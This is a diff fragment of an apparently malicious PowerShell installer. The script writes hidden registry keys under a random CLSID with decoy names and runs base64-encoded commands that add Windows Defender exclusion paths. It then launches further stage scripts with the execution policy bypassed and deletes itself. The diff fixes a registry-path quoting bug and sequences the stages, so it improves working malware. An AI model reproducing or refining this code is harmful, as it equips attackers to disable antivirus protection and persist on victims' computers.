@@ -7,7 +7,7 @@ $initServiceRootmonmonPath = "$initServiceRootmonmonPath\init_service_rootmonmon
 $initServiceFwdmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $initServiceFwdmonPath = "$initServiceFwdmonPath\init_service_fwdmon.ps1"
 $g = "{$([guid]::NewGuid().ToString().ToUpper())}"
-$basePath = "HKCU:\Software\Classes\CLSID\'$g'\Shell\Open\Command\DelegateExecute\Cache\Backup\Runtime\Legacy\system"
+$basePath = "HKCU:\Software\Classes\CLSID\$g\Shell\Open\Command\DelegateExecute\Cache\Backup\Runtime\Legacy\system"
 New-Item -Path $basePath -Force
 New-ItemProperty -Path $basePath -Name "mode" -PropertyType DWORD -Value 0xFFFFFFFF -Force | Out-Null
 $ms = @("WinSxS_Backup", "System32_Compat", "TrustedInstallerCache", "Edge_Telemetry", "DirectX_Logs") 
@@ -67,8 +67,7 @@ powershell -enc "cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFA
 powershell -enc "cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAZQByAHYAaQBjAGUAUAByAG8AZgBpAGwAZQBzAFwATABvAGMAYQBsAFMAZQByAHYAaQBjAGUAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAVwBpAG4AWAAiACAALwBmAA=="
 powershell -enc "cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAZQByAHYAaQBjAGUAUAByAG8AZgBpAGwAZQBzAFwATgBlAHQAdwBvAHIAawBTAGUAcgB2AGkAYwBlACIAIAAvAGYA"
 
-Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-Command", "$initServiceRootmonmonPath -rootPath '$rootPath' -basePath '$basePath\yXureYzQpIRLN'"
-Start-Sleep -Seconds 12
+Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-Command", "$initServiceRootmonmonPath -rootPath '$rootPath' -basePath '$basePath\yXureYzQpIRLN'" -Wait
 Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-Command", "$initServiceFwdmonPath -basePath '$basePath\yXureYzQpIRLN'"
 
 Remove-Item -Path $currLoc -Force -ErrorAction SilentlyContinue
